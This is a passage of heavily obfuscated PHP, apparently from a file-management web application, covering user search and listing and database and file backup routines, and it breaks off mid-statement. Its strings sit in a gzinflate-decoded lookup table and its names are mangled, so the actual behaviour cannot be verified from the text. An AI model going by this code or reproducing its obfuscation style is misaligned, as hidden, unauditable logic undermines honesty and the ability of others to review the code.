$éÖ©Úû¢[$èõ‡Êå[2331]] = $¬ªÃäÕš[$èõ‡Êå[769]]; } $Ç şøÈ = $this->_makeOrder($ŠüçÎ£¿)->field($èõ‡Êå[2332])->where($éÖ©Úû¢)->join($‹¼Ú£®)->selectPage(50); $this->_listDataApply($Ç şøÈ[$èõ‡Êå[369]]); return $Ç şøÈ; } private function _makeOrder($ıà¾ÊÛÊ = '') { $¦—Õ¥³Õ =& $_SERVER[ä¿÷‹µ±]; $Úç„Ìı = array($¦—Õ¥³Õ[1678], $¦—Õ¥³Õ[32], $¦—Õ¥³Õ[1839], $¦—Õ¥³Õ[1811], $¦—Õ¥³Õ[200]); $Ğ®Ø™ˆÑ = array($¦—Õ¥³Õ[450] => $¦—Õ¥³Õ[451], $¦—Õ¥³Õ[452] => $¦—Õ¥³Õ[453]); $¾ÙÈñºó = Input::get($¦—Õ¥³Õ[457], $¦—Õ¥³Õ[7], $¦—Õ¥³Õ[1669], $Úç„Ìı); $Í¤Ûˆª• = Input::get($¦—Õ¥³Õ[458], $¦—Õ¥³Õ[7], $¦—Õ¥³Õ[1941], array($¦—Õ¥³Õ[1941], $¦—Õ¥³Õ[452])); $Í¤Ûˆª• = $Ğ®Ø™ˆÑ[$Í¤Ûˆª•]; $ıà¾ÊÛÊ = $ıà¾ÊÛÊ . "\165\x73\x65\162\x2e{$¾ÙÈñºó}\x20{$Í¤Ûˆª•}\x2c\40\x75\163\145\x72\x2e\x75\x73\x65\x72\111\104\40\x61\163\143"; return $this->alias($¦—Õ¥³Õ[2063])->order($ıà¾ÊÛÊ); } public function listSearch($—®Âó×) { $ãÈ©¦¾Ù =& $_SERVER[ä¿÷‹µ±]; $•ù§”Ê• = $—®Âó×[$ãÈ©¦¾Ù[1944]]; $ß¸ÊËŸˆ = isset($—®Âó×[$ãÈ©¦¾Ù[1945]]) ? $—®Âó×[$ãÈ©¦¾Ù[1945]] : !1; $•ù§”Ê• = str_replace($ãÈ©¦¾Ù[1946], $ãÈ©¦¾Ù[1947], trim($•ù§”Ê•)); $ë…†®‡ = array($ãÈ©¦¾Ù[32] => array($ãÈ©¦¾Ù[383], "\45{$•ù§”Ê•}\45"), $ãÈ©¦¾Ù[305] => array($ãÈ©¦¾Ù[383], "{$•ù§”Ê•}\x25"), $ãÈ©¦¾Ù[542] => array($ãÈ©¦¾Ù[383], "{$•ù§”Ê•}\x25"), $ãÈ©¦¾Ù[1022] => $ãÈ©¦¾Ù[1948]); if (Input::check($•ù§”Ê•, $ãÈ©¦¾Ù[311])) { $ë…†®‡[$ãÈ©¦¾Ù[1678]] = array($ãÈ©¦¾Ù[383], "{$•ù§”Ê•}\45"); $ë…†®‡[$ãÈ©¦¾Ù[2314]] = array($ãÈ©¦¾Ù[383], "{$•ù§”Ê•}\45"); } if (!$•ù§”Ê•) { $ë…†®‡ = array(); } if (isset($—®Âó×[$ãÈ©¦¾Ù[769]])) { $ë…†®‡[$ãÈ©¦¾Ù[769]] = $—®Âó×[$ãÈ©¦¾Ù[769]]; } $ë…†®‡ = $this->parseWhereLike($ë…†®‡); $·œº›¸Ğ = $this->_makeOrder()->where($ë…†®‡)->selectPage(20); if (!$·œº›¸Ğ || count($·œº›¸Ğ[$ãÈ©¦¾Ù[369]]) < 5 && Input::check($•ù§”Ê•, $ãÈ©¦¾Ù[318])) { $½¤‘Ç» = $this->_searchFromMeta($ãÈ©¦¾Ù[464], $•ù§”Ê•, 10); $«éŞ¢ˆÌ = $this->_searchFromMeta($ãÈ©¦¾Ù[465], $•ù§”Ê•, 10); $ÛÊšîÄà = array_merge($½¤‘Ç», $«éŞ¢ˆÌ, $·œº›¸Ğ[$ãÈ©¦¾Ù[369]]); $·œº›¸Ğ[$ãÈ©¦¾Ù[369]] = array_unique_by_key($ÛÊšîÄà, $ãÈ©¦¾Ù[1678]); $·œº›¸Ğ[$ãÈ©¦¾Ù[366]][$ãÈ©¦¾Ù[367]] = count($·œº›¸Ğ[$ãÈ©¦¾Ù[369]]); $·œº›¸Ğ[$ãÈ©¦¾Ù[366]][$ãÈ©¦¾Ù[368]] = ceil($·œº›¸Ğ[$ãÈ©¦¾Ù[366]][$ãÈ©¦¾Ù[367]] / $·œº›¸Ğ[$ãÈ©¦¾Ù[366]][$ãÈ©¦¾Ù[363]]); } $this->_listDataApply($·œº›¸Ğ[$ãÈ©¦¾Ù[369]]); $this->_filterByGroup($·œº›¸Ğ, $ß¸ÊËŸˆ); return $·œº›¸Ğ; } private function _filterByGroup(&$ğ¼«¸¨½, $¹üÓ’Î”) { $º²Ñ± =& $_SERVER[ä¿÷‹µ±]; if (!$¹üÓ’Î”) { return $ğ¼«¸¨½; } foreach ($ğ¼«¸¨½[$º²Ñ±[369]] as $Ü”Ù´• => &$£ß¢Òäœ) { $åõ×š¡ = array_to_keyvalue($£ß¢Òäœ[$º²Ñ±[2033]], $º²Ñ±[12], $º²Ñ±[1850]); if (!in_array($¹üÓ’Î”, $åõ×š¡)) { unset($ğ¼«¸¨½[$º²Ñ±[369]][$Ü”Ù´•]); } } unset($£ß¢Òäœ); $ğ¼«¸¨½[$º²Ñ±[369]] = array_values($ğ¼«¸¨½[$º²Ñ±[369]]); $ğ¼«¸¨½[$º²Ñ±[366]] = array($º²Ñ±[2097] => count($ğ¼«¸¨½[$º²Ñ±[369]]), $º²Ñ±[2095] => $ğ¼«¸¨½[$º²Ñ±[366]][$º²Ñ±[363]], $º²Ñ±[2094] => 1, $º²Ñ±[2096] => 1); } private function _searchFromMeta($™†›¿ó¶, $ù–ŒñÛ­, $æ…—×€¬) { $‘“ÒŒ¤— =& $_SERVER[ä¿÷‹µ±]; $ù–ŒñÛ­ = strtolower($ù–ŒñÛ­); $Ì¿Ô¸æ€ = array($‘“ÒŒ¤—[94] => $™†›¿ó¶, $‘“ÒŒ¤—[374] => array($‘“ÒŒ¤—[383], "\45{$ù–ŒñÛ­}\x25")); $Ì¿Ô¸æ€ = $this->parseWhereLike($Ì¿Ô¸æ€); $Ÿˆ‹çò– = Model($‘“ÒŒ¤—[2333])->where($Ì¿Ô¸æ€)->limit($æ…—×€¬)->select(); if (!$Ÿˆ‹çò–) { return array(); } $Ÿˆ‹çò– = array_to_keyvalue($Ÿˆ‹çò–, $‘“ÒŒ¤—[12], $‘“ÒŒ¤—[1678]); $öı¯ÎªÈ = $this->where(array($‘“ÒŒ¤—[1669] => array($‘“ÒŒ¤—[7], $Ÿˆ‹çò–)))->select(); if (!$öı¯ÎªÈ) { return array(); } return $öı¯ÎªÈ; } private function _listDataApplyItem($äÈ–İ°Ø) { $²—ªİ£ = array($äÈ–İ°Ø); $this->_listDataApply($²—ªİ£); return $²—ªİ£[0]; } private function _listDataApply(&$¬¯Å²å…) { $æôæõâ =& $_SERVER[ä¿÷‹µ±]; if (!$¬¯Å²å…) { return; } array_remove_key($¬¯Å²å…, $æôæõâ[909]); $±õ›³ = array_to_keyvalue($¬¯Å²å…, $æôæõâ[12], $æôæõâ[1678]); $this->_listAppendGroup($¬¯Å²å…, $±õ›³); $this->_listAppendMeta($¬¯Å²å…, $±õ›³); $this->_listAppendSourceRoot($¬¯Å²å…, $±õ›³); } private function _listAppendSourceRoot(&$áöé­¾‰, $ºõçƒ±É) { $Í¢âóÎ’ =& $_SERVER[ä¿÷‹µ±]; $ş¤¾ŞèÆ = Model($Í¢âóÎ’[844])->listSourceRoot(SourceModel::TYPE_USER, $ºõçƒ±É); $ş¤¾ŞèÆ = array_to_keyvalue($ş¤¾ŞèÆ, $Í¢âóÎ’[505]); $ş¤¾ŞèÆ = array_remove_key($ş¤¾ŞèÆ, $Í¢âóÎ’[505]); foreach ($áöé­¾‰ as &$œ÷Üïùî) { $œ÷Üïùî[$Í¢âóÎ’[86]] = $ş¤¾ŞèÆ[$œ÷Üïùî[$Í¢âóÎ’[1678]]] ? $ş¤¾ŞèÆ[$œ÷Üïùî[$Í¢âóÎ’[1678]]] : array(); } unset($œ÷Üïùî); } private function _listAppendGroup(&$Ä„¿³üƒ, $éÉë§ÜÖ) { $²ô‡ÌÀÊ =& $_SERVER[ä¿÷‹µ±]; $±°şÒ˜ù = array($²ô‡ÌÀÊ[1678] => array($²ô‡ÌÀÊ[7], $éÉë§ÜÖ)); $Ú¦é¤Ç« = Model($²ô‡ÌÀÊ[1940])->where($±°şÒ˜ù)->select(); $è¯­Á¼ = array_to_keyvalue($Ú¦é¤Ç«, $²ô‡ÌÀÊ[12], $²ô‡ÌÀÊ[1850]); $è¯­Á¼ = array_remove_value(array_unique($è¯­Á¼), $²ô‡ÌÀÊ[197]); if (!$è¯­Á¼ || !$Ú¦é¤Ç«) { return; } $±°şÒ˜ù = array($²ô‡ÌÀÊ[1850] => array($²ô‡ÌÀÊ[7], $è¯­Á¼)); $‰Ú‘Û¥î = Model($²ô‡ÌÀÊ[2031])->field($²ô‡ÌÀÊ[2334])->where($±°şÒ˜ù)->select(); $‰Ú‘Û¥î = array_to_keyvalue($‰Ú‘Û¥î, $²ô‡ÌÀÊ[1850]); $Ú¦é¤Ç« = array_to_keyvalue_group($Ú¦é¤Ç«, $²ô‡ÌÀÊ[1678]); foreach ($Ú¦é¤Ç« as &$ûÊ¨…à) { $ÂÍÅ›š¾ = array(); foreach ($ûÊ¨…à as $Ã¿Ó«ªÍ) { if (!$Ã¿Ó«ªÍ[$²ô‡ÌÀÊ[1954]]) { continue; } $ôÙİë°× = Model($²ô‡ÌÀÊ[507])->listData($Ã¿Ó«ªÍ[$²ô‡ÌÀÊ[1954]]); $ÂÍÅ›š¾[] = array($²ô‡ÌÀÊ[1850] => $Ã¿Ó«ªÍ[$²ô‡ÌÀÊ[1850]], $²ô‡ÌÀÊ[2335] => $‰Ú‘Û¥î[$Ã¿Ó«ªÍ[$²ô‡ÌÀÊ[1850]]][$²ô‡ÌÀÊ[32]], $²ô‡ÌÀÊ[521] => $‰Ú‘Û¥î[$Ã¿Ó«ªÍ[$²ô‡ÌÀÊ[1850]]][$²ô‡ÌÀÊ[521]], $²ô‡ÌÀÊ[413] => $ôÙİë°×); } $ûÊ¨…à = $ÂÍÅ›š¾; } unset($ûÊ¨…à); foreach ($Ä„¿³üƒ as &$ÒÖàŞâ™) { $ÒÖàŞâ™[$²ô‡ÌÀÊ[2033]] = array(); if (isset($Ú¦é¤Ç«[$ÒÖàŞâ™[$²ô‡ÌÀÊ[1678]]])) { $ÒÖàŞâ™[$²ô‡ÌÀÊ[2033]] = $Ú¦é¤Ç«[$ÒÖàŞâ™[$²ô‡ÌÀÊ[1678]]]; } } unset($ÒÖàŞâ™); } public function userAppendGroup($İŠ¹Û“ø) { $şåØş‡ù =& $_SERVER[ä¿÷‹µ±]; if (!$İŠ¹Û“ø) { return array(); } $this->_listAppendGroup($İŠ¹Û“ø, array_to_keyvalue($İŠ¹Û“ø, $şåØş‡ù[12], $şåØş‡ù[1678])); return $İŠ¹Û“ø; } private function _listAppendMeta(&$İ»é„‰±, $èƒ£Å‘î) { $øî¹¼å« =& $_SERVER[ä¿÷‹µ±]; $£à»—âé = UserJobModel::JOB_KEY; $üî¨øñ = array($øî¹¼å«[2315]); $ßØˆ°„ = array($øî¹¼å«[1678] => array($øî¹¼å«[7], $èƒ£Å‘î)); $äşÜı°´ = Model($øî¹¼å«[2313])->where($ßØˆ°„)->select(); $äşÜı°´ = array_to_keyvalue_group($äşÜı°´, $øî¹¼å«[1678]); foreach ($äşÜı°´ as &$Š¨Å´¢”) { $‰‚‡á¹Õ = array(); foreach ($Š¨Å´¢” as $ÏË£ìØı) { if (!in_array($ÏË£ìØı[$øî¹¼å«[94]], $üî¨øñ)) { $‰‚‡á¹Õ[$ÏË£ìØı[$øî¹¼å«[94]]] = $ÏË£ìØı[$øî¹¼å«[374]]; } } $Š¨Å´¢” = $‰‚‡á¹Õ; } unset($Š¨Å´¢”); $€¼º„ãñ = Model($øî¹¼å«[2336]); foreach ($İ»é„‰± as &$µ°üäÔö) { $ûìöƒëç = array(); if (isset($äşÜı°´[$µ°üäÔö[$øî¹¼å«[1678]]])) { $ûìöƒëç = $äşÜı°´[$µ°üäÔö[$øî¹¼å«[1678]]]; } $µ°üäÔö[$øî¹¼å«[2337]] = array(); if (isset($ûìöƒëç[$£à»—âé])) { $µ°üäÔö[$øî¹¼å«[2337]] = $€¼º„ãñ->getUserJobInfo($ûìöƒëç[$£à»—âé]); } } unset($µ°üäÔö); } protected function groupUserAll($ùïŞ„ã) { $Ì­Ÿ–—¤ =& $_SERVER[ä¿÷‹µ±]; if (!$ùïŞ„ã) { return !1; } $®äàîÂ = Model($Ì­Ÿ–—¤[1940])->field($Ì­Ÿ–—¤[1678])->where(array($Ì­Ÿ–—¤[1850] => array($Ì­Ÿ–—¤[7], $ùïŞ„ã)))->select(); $®äàîÂ = array_to_keyvalue($®äàîÂ, $Ì­Ÿ–—¤[12], $Ì­Ÿ–—¤[1678]); return array_unique($®äàîÂ); } public function userSearch($Ûø“û¾Ÿ, $ö”–«ğ = "\52") { return Model($_SERVER[ä¿÷‹µ±][535])->where($Ûø“û¾Ÿ)->field($ö”–«ğ)->find(); } } goto eÚŞ¶…„‚; CíÄÍÌÇ»æ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $âöñ­÷ =& $_SERVER[ä¿÷‹µ±]; $this->isManual(); self::$name = date($âöñ­÷[767]); if (!($ŸˆŞ£í¬ = Model($âöñ­÷[768])->lastItem())) { $ŸˆŞ£í¬ = $this->initData(); } else { self::$name = $ŸˆŞ£í¬[$âöñ­÷[32]]; if ($ŸˆŞ£í¬[$âöñ­÷[769]] == $âöñ­÷[88]) { self::$name = date($âöñ­÷[770]); $’Ú»æ·‚ = 0; if (isset($ŸˆŞ£í¬[$âöñ­÷[293]][$âöñ­÷[199]][$âöñ­÷[468]])) { $’Ú»æ·‚ = (int) $ŸˆŞ£í¬[$âöñ­÷[293]][$âöñ­÷[199]][$âöñ­÷[468]]; } if (self::$manual == 0 && $ŸˆŞ£í¬[$âöñ­÷[32]] == self::$name) { Model($âöñ­÷[768])->remove($ŸˆŞ£í¬[$âöñ­÷[399]]); } $ŸˆŞ£í¬ = $this->initData($’Ú»æ·‚, $ŸˆŞ£í¬[$âöñ­÷[771]]); } else { $this->checkStore($ŸˆŞ£í¬[$âöñ­÷[771]]); } } self::$option = $ŸˆŞ£í¬; } private function isManual() { $È¿´ı¨ƒ = _get($GLOBALS, $_SERVER[ä¿÷‹µ±][772], 0); $È¿´ı¨ƒ = intval($È¿´ı¨ƒ); self::$manual = $È¿´ı¨ƒ && $È¿´ı¨ƒ == 1 ? 1 : 0; } private function initData($àÆìå· = 0, $á©úí›Õ = '') { $¼ç×í´÷ =& $_SERVER[ä¿÷‹µ±]; $¯íÌÇ¶Ÿ = Model($¼ç×í´÷[768])->config(); if ($á©úí›Õ && $¯íÌÇ¶Ÿ[$¼ç×í´÷[771]] != $á©úí›Õ) { $àÆìå· = 0; } $this->checkStore($¯íÌÇ¶Ÿ[$¼ç×í´÷[771]]); if (self::$manual == 1) { self::$name .= $¼ç×í´÷[11] . date($¼ç×í´÷[773]); } $ôÅ¬òú = array($¼ç×í´÷[771] => $¯íÌÇ¶Ÿ[$¼ç×í´÷[771]], $¼ç×í´÷[32] => self::$name, $¼ç×í´÷[769] => 0, $¼ç×í´÷[774] => $¯íÌÇ¶Ÿ[$¼ç×í´÷[774]], $¼ç×í´÷[775] => self::$manual, $¼ç×í´÷[293] => array($¼ç×í´÷[776] => array($¼ç×í´÷[769] => 0), $¼ç×í´÷[777] => array($¼ç×í´÷[769] => 0, $¼ç×í´÷[778] => 0, $¼ç×í´÷[779] => 0, $¼ç×í´÷[33] => $¼ç×í´÷[12], $¼ç×í´÷[780] => 0, $¼ç×í´÷[497] => 0), $¼ç×í´÷[781] => array($¼ç×í´÷[769] => 0, $¼ç×í´÷[778] => 0, $¼ç×í´÷[779] => 0, $¼ç×í´÷[780] => 0, $¼ç×í´÷[497] => 0), $¼ç×í´÷[199] => array($¼ç×í´÷[769] => 0, $¼ç×í´÷[782] => 0, $¼ç×í´÷[783] => 0, $¼ç×í´÷[784] => 0, $¼ç×í´÷[785] => 0, $¼ç×í´÷[468] => $àÆìå·, $¼ç×í´÷[780] => 0, $¼ç×í´÷[497] => 0)), $¼ç×í´÷[780] => time(), $¼ç×í´÷[497] => 0); $ŞËŞĞˆİ = Model($¼ç×í´÷[768])->insert($ôÅ¬òú); $ôÅ¬òú[$¼ç×í´÷[399]] = $ŞËŞĞˆİ; return $ôÅ¬òú; } private function checkStore($ÄóÒ¨ÌÑ) { $¿»‰É¼ =& $_SERVER[ä¿÷‹µ±]; $Ó§€¹Òï = Model($¿»‰É¼[786])->listData($ÄóÒ¨ÌÑ); Model($¿»‰É¼[786])->checkConfig($Ó§€¹Òï); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ä¿÷‹µ±][768])->findByName(self::$name); } return self::$option; } public static function set($‚À¡õ¼) { $€çÄâ«¢ =& $_SERVER[ä¿÷‹µ±]; $ÆšÅ†±‰ = self::get(); foreach ($‚À¡õ¼ as $ìŸ¿¨¥ => $·Ç€±Ç) { $Îª¬À© = explode($€çÄâ«¢[10], $ìŸ¿¨¥); $ğˆ›”ŠÃ = count($Îª¬À©); switch ($ğˆ›”ŠÃ) { case 1: $ÆšÅ†±‰[$Îª¬À©[0]] = $·Ç€±Ç; break; case 2: $ÆšÅ†±‰[$Îª¬À©[0]][$Îª¬À©[1]] = $·Ç€±Ç; break; case 3: $ÆšÅ†±‰[$Îª¬À©[0]][$Îª¬À©[1]][$Îª¬À©[2]] = $·Ç€±Ç; break; } } Model($€çÄâ«¢[768])->update($ÆšÅ†±‰[$€çÄâ«¢[399]], $ÆšÅ†±‰); self::$option = $ÆšÅ†±‰; return self::$option; } public function keep() { $ü®ƒíÔÒ =& $_SERVER[ä¿÷‹µ±]; $¯Á§‘—“ = self::get(); if ($¯Á§‘—“[$ü®ƒíÔÒ[293]][$ü®ƒíÔÒ[776]][$ü®ƒíÔÒ[769]] == $ü®ƒíÔÒ[88]) { return; } $this->backupKeep($¯Á§‘—“); self::set(array($ü®ƒíÔÒ[787] => 1)); } private function backupKeep($íö±ÓŸÛ) { $Ş‡şŒçÀ =& $_SERVER[ä¿÷‹µ±]; if (self::$manual == 1) { return; } $±ÑÃîŞ£ = Model($Ş‡şŒçÀ[768])->listData(); if (empty($±ÑÃîŞ£)) { return; } $­¾Ü€“é = 0; $§ãüäŞı = array(); foreach ($±ÑÃîŞ£ as $É²ãŸÀâ) { if ($­¾Ü€“é >= 7) { break; } $§ãüäŞı[] = $É²ãŸÀâ[$Ş‡şŒçÀ[32]]; $­¾Ü€“é++; } for ($­¾Ü€“é = 0; $­¾Ü€“é < 12; $­¾Ü€“é++) { $§ãüäŞı[] = date($Ş‡şŒçÀ[788], strtotime("\55{$­¾Ü€“é}\x20\155\157\x6e\x74\x68\163")); } $§ãüäŞı = array_unique($§ãüäŞı); $Ê×‡¼´Ÿ = Model($Ş‡şŒçÀ[789])->get($Ş‡şŒçÀ[790]); foreach ($±ÑÃîŞ£ as $É²ãŸÀâ) { if (isset($É²ãŸÀâ[$Ş‡şŒçÀ[775]]) && $É²ãŸÀâ[$Ş‡şŒçÀ[775]] == $Ş‡şŒçÀ[88]) { continue; } if (!empty($É²ãŸÀâ[$Ş‡şŒçÀ[32]]) && in_array($É²ãŸÀâ[$Ş‡şŒçÀ[32]], $§ãüäŞı)) { continue; } Model($Ş‡şŒçÀ[768])->remove($É²ãŸÀâ[$Ş‡şŒçÀ[399]]); $ÊÀèêà = $this->backupPath($íö±ÓŸÛ, $Ê×‡¼´Ÿ); IO::remove($ÊÀèêà, !1); } } private function backupPath($ï¬´ÓŒÍ, $‚Ï‰€¿È = false) { $çîãÖ…€ =& $_SERVER[ä¿÷‹µ±]; if (!$‚Ï‰€¿È) { $‚Ï‰€¿È = Model($çîãÖ…€[789])->get($çîãÖ…€[790]); } $ËÌÂ€²º = $ï¬´ÓŒÍ[$çîãÖ…€[32]]; $ªöåÈ‡ = substr(md5($çîãÖ…€[791] . $‚Ï‰€¿È . $ËÌÂ€²º), 0, 8); return "\x7b\x69\157\72{$ï¬´ÓŒÍ[$çîãÖ…€[771]]}\x7d\x2f\x64\141\164\141\142\x61\163\x65\57\x62\141\143\x6b\x75\160\57" . $ËÌÂ€²º . $çîãÖ…€[11] . $ªöåÈ‡; } public function db() { $”¼ËÁæ =& $_SERVER[ä¿÷‹µ±]; $˜üùÉ = self::get(); if ($˜üùÉ[$”¼ËÁæ[293]][$”¼ËÁæ[777]][$”¼ËÁæ[769]] == $”¼ËÁæ[88]) { return !0; } $‰®ÑÊŠŞ = new BackupDb(); if (!$‰®ÑÊŠŞ->index()) { return !1; } self::set(array($”¼ËÁæ[792] => 1)); return !0; } public function dbFile() { $é“ÖÌº½ =& $_SERVER[ä¿÷‹µ±]; $Ôşöà×ê = self::get(); if ($Ôşöà×ê[$é“ÖÌº½[293]][$é“ÖÌº½[781]][$é“ÖÌº½[769]] == $é“ÖÌº½[88]) { return !0; } $®–¡¡âÜ = new BackupDbFile(); if (!$®–¡¡âÜ->index()) { return !1; } self::set(array($é“ÖÌº½[793] => 1)); return !0; } public function file() { $Ÿ—•¦ª¯ =& $_SERVER[ä¿÷‹µ±]; $ÖàÄÃ·Î = self::get(); if ($ÖàÄÃ·Î[$Ÿ—•¦ª¯[293]][$Ÿ—•¦ª¯[199]][$Ÿ—•¦ª¯[769]] == $Ÿ—•¦ª¯[88]) { return !0; } if (!isset($ÖàÄÃ·Î[$Ÿ—•¦ª¯[774]]) || $ÖàÄÃ·Î[$Ÿ—•¦ª¯[774]] == $Ÿ—•¦ª¯[197]) { $¦ËÜ°´™ = new BackupFile(); if (!$¦ËÜ°´™->index()) { return !1; } } self::set(array($Ÿ—•¦ª¯[794] => 1, $Ÿ—•¦ª¯[769] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¥®ıÖõÀ =& $_SERVER[ä¿÷‹µ±]; $¤™»½í­ = Backup::get(); self::$io = $¤™»½í­[$¥®ıÖõÀ[771]]; self::$name = $¤™»½í­[$¥®ıÖõÀ[32]]; $¹×­Æ˜û = new DbManage(); $£‘Ççç¢ = $¹×­Æ˜û->dbType(); $¿ûŸšÆØ = array($¥®ıÖõÀ[795] => $£‘Ççç¢, $¥®ıÖõÀ[796] => time()); Backup::set($¿ûŸšÆØ); $»ÙıßËò = $this->tmpFilesPath() . $¥®ıÖõÀ[797] . self::$name . $¥®ıÖõÀ[8]; del_dir($»ÙıßËò); mk_dir($»ÙıßËò); $ÏÍŒ¾— = $ÚÙõìé = 0; $¯Â¹Æï» = new Task($¥®ıÖõÀ[798], $¥®ıÖõÀ[799], 0, LNG($¥®ıÖõÀ[800]) . $¥®ıÖõÀ[801] . LNG($¥®ıÖõÀ[802])); try { $ìèâÎû‚ = $¹×­Æ˜û->db()->getTables(); } catch (Exception $ñÜ¸ùÅš) { $¯Â¹Æï»->end(); return !1; } $ìèâÎû‚ = array_diff($ìèâÎû‚, array($¥®ıÖõÀ[803], $¥®ıÖõÀ[804])); foreach ($ìèâÎû‚ as $ŒªôºŞ–) { $ÏÍŒ¾— += $¹×­Æ˜û->model($ŒªôºŞ–)->count(); } $¯Â¹Æï»->task[$¥®ıÖõÀ[805]] = $ÏÍŒ¾—; $GLOBALS[$¥®ıÖõÀ[806]] = self::$name; foreach ($ìèâÎû‚ as $ŒªôºŞ–) { $è–ÔĞ¦ = $»ÙıßËò . $ŒªôºŞ– . $¥®ıÖõÀ[807]; $Ğ¸¶“ªè = null; if ($ŒªôºŞ– == $¥®ıÖõÀ[808] && (!isset($¤™»½í­[$¥®ıÖõÀ[774]]) || $¤™»½í­[$¥®ıÖõÀ[774]] == $¥®ıÖõÀ[197])) { $Ğ¸¶“ªè = self::$io; } $ÚÙõìé += $¹×­Æ˜û->sqlFromDb($ŒªôºŞ–, $è–ÔĞ¦, $¯Â¹Æï», $Ğ¸¶“ªè); } unset($GLOBALS[$¥®ıÖõÀ[806]]); $¯Â¹Æï»->end(); if ($ÚÙõìé > $ÏÍŒ¾—) { $ÏÍŒ¾— = $ÚÙõìé; } $¿ûŸšÆØ = array($¥®ıÖõÀ[795] => $£‘Ççç¢, $¥®ıÖõÀ[792] => 1, $¥®ıÖõÀ[809] => $ÏÍŒ¾—, $¥®ıÖõÀ[810] => $ÚÙõìé, $¥®ıÖõÀ[811] => time()); Backup::set($¿ûŸšÆØ); if ($ÏÍŒ¾— - $ÚÙõìé > 0) { $şû«µ²ô = $¥®ıÖõÀ[812]; if (stristr(I18n::getType(), $¥®ıÖõÀ[813])) { $şû«µ²ô = $¥®ıÖõÀ[814]; } write_log(array($şû«µ²ô, $¿ûŸšÆØ), $¥®ıÖõÀ[799]); return !1; } return !0; } private function tmpFilesPath() { $ç¶¯å =& $_SERVER[ä¿÷‹µ±]; $­ø¬Ë¿Ğ = TEMP_FILES; if ($GLOBALS[$ç¶¯å[6]][$ç¶¯å[89]][$ç¶¯å[815]]) { $­ø¬Ë¿Ğ = $GLOBALS[$ç¶¯å[6]][$ç¶¯å[89]][$ç¶¯å[815]]; if (!mk_dir($­ø¬Ë¿Ğ) || !is_writable($­ø¬Ë¿Ğ) || !IO::mkfile($­ø¬Ë¿Ğ . $ç¶¯å[816])) { $­ø¬Ë¿Ğ = TEMP_FILES; } } return $­ø¬Ë¿Ğ; } } class BackupDbFile { public function __construct() { } public function index() { $Òü£¨ÓÃ =& $_SERVER[ä¿÷‹µ±]; $•úœÅè× = Backup::get(); $¥ëĞğæ² = $•úœÅè×[$Òü£¨ÓÃ[32]]; $˜ÏÖÉ’ö = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\x5f{$¥ëĞğæ²}\57"; $ÙÌËˆı = $this->backupPath($•úœÅè×); if (!($ÙÌËˆı = IO::mkdir($ÙÌËˆı))) { return !1; } $™¾û¢ï = IO::listPath($˜ÏÖÉ’ö); $êåíï¥º = isset($™¾û¢ï[$Òü£¨ÓÃ[83]]) ? $™¾û¢ï[$Òü£¨ÓÃ[83]] : array(); $ôĞ¿÷û = array_sum(array_column($êåíï¥º, $Òü£¨ÓÃ[76])); if (!$ôĞ¿÷û) { return !1; } $àüÆı÷Ÿ = array($Òü£¨ÓÃ[817] => $ôĞ¿÷û, $Òü£¨ÓÃ[818] => time()); Backup::set($àüÆı÷Ÿ); $Â½ö¬Ä = new TaskFileTransfer($Òü£¨ÓÃ[819], $Òü£¨ÓÃ[799], count($êåíï¥º), LNG($Òü£¨ÓÃ[800]) . $Òü£¨ÓÃ[386] . LNG($Òü£¨ÓÃ[802]) . $Òü£¨ÓÃ[820]); $Â½ö¬Ä->task[$Òü£¨ÓÃ[782]] = $ôĞ¿÷û; foreach ($™¾û¢ï[$Òü£¨ÓÃ[83]] as $øè¼á…) { $í¸§™Áú = IO::move($øè¼á…[$Òü£¨ÓÃ[84]], $ÙÌËˆı); if (!$í¸§™Áú) { $Â½ö¬Ä->end(); $Ø´ˆ»ëâ = IO::getLastError($Òü£¨ÓÃ[821] . $øè¼á…[$Òü£¨ÓÃ[84]] . $Òü£¨ÓÃ[822] . $ÙÌËˆı . $Òü£¨ÓÃ[164]); write_log($Ø´ˆ»ëâ, $Òü£¨ÓÃ[799]); return !1; } } $Èƒ§…µ = new DbManage(); $Ñõµ– = $Èƒ§…µ->getSqlFile(); if (!$Ñõµ–[$Òü£¨ÓÃ[823]] || !$Ñõµ–[$Òü£¨ÓÃ[13]]) { return !1; } IO::move($Ñõµ–[$Òü£¨ÓÃ[823]], $ÙÌËˆı); IO::move($Ñõµ–[$Òü£¨ÓÃ[13]], $ÙÌËˆı); $Â½ö¬Ä->end(); $àüÆı÷Ÿ = array($Òü£¨ÓÃ[824] => $ôĞ¿÷û, $Òü£¨ÓÃ[825] => time()); Backup::set($àüÆı÷Ÿ); return !0; } private function backupPath($è¯Õøñè) { $µæ¶¯ =& $_SERVER[ä¿÷‹µ±]; $àµŸÂÉİ = $è¯Õøñè[$µæ¶¯[32]]; $íÖ‚º´Õ = Model($µæ¶¯[789])->get($µæ¶¯[790]); $–áŞÌè´ = substr(md5($µæ¶¯[791] . $íÖ‚º´Õ . $àµŸÂÉİ), 0, 8); return "\173\151\157\x3a{$è¯Õøñè[$µæ¶¯[771]]}\175\57\144\x61\x74\141\x62\x61\x73\145\x2f\142\x61\x63\153\x75\160\x2f" . $àµŸÂÉİ . $µæ¶¯[11] . $–áŞÌè´; } private function tmpFilesPath() { $æïàµ =& $_SERVER[ä¿÷‹µ±]; $Û›ê´É  = TEMP_FILES; if ($GLOBALS[$æïàµ[6]][$æïàµ[89]][$æïàµ[815]]) { $Û›ê´É  = $GLOBALS[$æïàµ[6]][$æïàµ[89]][$æïàµ[815]]; if (!mk_dir($Û›ê´É ) || !is_writable($Û›ê´É ) || !IO::mkfile($Û›ê´É  . $æïàµ[816])) { $Û›ê´É  = TEMP_FILES; } } return $Û›ê´É ; } } goto Eå¨Š¦Åì; f†“ö™‚ƒî: define($_SERVER[ä¿÷‹µ±][612], $_SERVER[ä¿÷‹µ±][613]); $tfqypdemwg = $_SERVER[ä¿÷‹µ±][614]; $_SERVER[ÒÆÆšøŠ] = explode($_SERVER[ä¿÷‹µ±][615], gzinflate(substr($_SERVER[ä¿÷‹µ±][616], 10, -8))); goto EÃ›ÄÏ³èË; C‘¥Şãˆ®’: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($³ÑÎ¿©Ä, $…èÕéêÖ = 5.0) { if (!$³ÑÎ¿©Ä) { return; } $ØíŸ§´î = Cache::get($³ÑÎ¿©Ä); if 